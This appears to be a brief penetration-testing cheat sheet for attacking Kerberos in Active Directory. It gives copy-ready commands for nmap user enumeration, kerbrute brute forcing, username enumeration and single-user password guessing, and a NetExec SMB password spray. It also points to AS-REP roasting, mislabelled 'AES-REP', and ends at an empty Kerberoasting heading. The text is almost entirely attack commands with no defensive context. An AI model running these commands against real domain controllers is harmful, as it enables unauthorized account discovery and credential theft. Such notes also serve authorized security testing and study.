#### Enumerate
```
nmap --script krb5-enum-users --script-args krb5-enum-users.realm="$domain" -p 88 "$ip"
```
#### Brute force authentication
-  `--dc`: domain controller
-  `-d`: domain
- `combos.txt`: the wordlist specified must be combinations with "`username:password`".
```
kerbrute bruteforce --dc "$ip" -d "$domain" combos.txt
```
#### Users enumeration
```
kerbrute userenum --dc "$ip" -d "$domain" usernames.txt
```
#### Brute force user's password
```
kerbrute bruteuser --dc "$ip" -d "$domain" passwords.txt username
```
#### Password spraying attack
```
nxc smb "$ip" -u users -p users  --continue-on-success --no-brute
```

#### AES-REP Roasting
We might be able to find password hashes of user accounts that does not require `preauthentication`.
Please see AS-REP Roasting.
#### Kerberoasting attacks

